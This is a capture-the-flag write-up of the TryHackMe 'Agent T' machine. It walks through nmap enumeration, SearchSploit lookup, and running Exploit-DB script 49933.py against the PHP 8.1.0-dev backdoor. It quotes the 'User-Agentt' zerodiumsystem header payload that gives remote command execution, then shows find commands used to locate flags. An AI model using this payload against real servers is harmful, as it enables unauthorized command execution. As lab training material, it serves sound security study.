# Agent T — TryHackMe Writeup

## Overview

Agent T is an easy Linux machine on TryHackMe. The main vulnerability is a backdoor in PHP 8.1.0-dev that allows remote command execution through a specially crafted HTTP header.

The attack path is based on service enumeration, identifying the vulnerable PHP version, finding a public exploit, and using it to execute commands on the target.

## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV TARGET_IP
```

The web service was running on port 80. Its response revealed the PHP version:

```text
PHP/8.1.0-dev
```

This version was suspicious because an early development build of PHP 8.1.0 contained a backdoor.

Instead of blindly searching for vulnerabilities, I used the exact version as the starting point for further investigation.

## 2. Finding the Exploit

I searched the local Exploit-DB database using SearchSploit.

```bash
searchsploit "PHP 8.1.0-dev"
```

The search returned a matching exploit:

```text
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
php/webapps/49933.py
```

The exploit uses a backdoor that processes a specially crafted `User-Agentt` HTTP header.

I inspected the exploit before using it:

```bash
searchsploit -x 49933
```

Then I copied it into the current working directory:

```bash
searchsploit -m 49933
```

## 3. Exploitation

The exploit is a Python script that sends HTTP requests to the target.

I ran it with Python 3:

```bash
python3 49933.py
```

When prompted for the target URL, I supplied the full HTTP address:

```text
http://TARGET_IP
```

The script first sends a normal GET request. If the server returns HTTP 200, it opens an interactive command prompt.

The exploit then sends commands through the `User-Agentt` header using the vulnerable PHP backdoor.

The important part of the script is:

```python
"User-Agentt": "zerodiumsystem('" + cmd + "');"
```

This header triggers the backdoor in the vulnerable PHP build, allowing commands to be executed on the target system.

## 4. Finding the Flags

After obtaining command execution, I used the Linux `find` command to locate the flag files.

To search for a file named `flag` across the filesystem:

```bash
find / -type f -name "flag" 2>/dev/null
```

To search for the usual TryHackMe flag filenames:

```bash
find / -type f \( -name "user.txt" -o -name "root.txt" \) 2>/dev/null
```

The `2>/dev/null` part hides permission errors and keeps the output readable.

After locating a flag, its contents can be read with:

```bash
cat /path/to/flag
```

## Attack Path

1. Scan the target with Nmap.
2. Identify the web service and PHP 8.1.0-dev.
3. Search Exploit-DB using SearchSploit.
4. Inspect and copy exploit 49933.py.
5. Run the Python exploit against the target URL.
6. Use the resulting command execution to search for the flags.

## Key Takeaways

- Service version detection can reveal a direct path to a known vulnerability.
- SearchSploit is useful for finding public exploits without manually browsing multiple databases.
- A public exploit is not automatically a Metasploit module.
- The PHP 8.1.0-dev backdoor uses the `User-Agentt` HTTP header.
- Connection errors must be investigated before assuming an exploit is broken.
- Understanding why an exploit works is more valuable than simply running it.
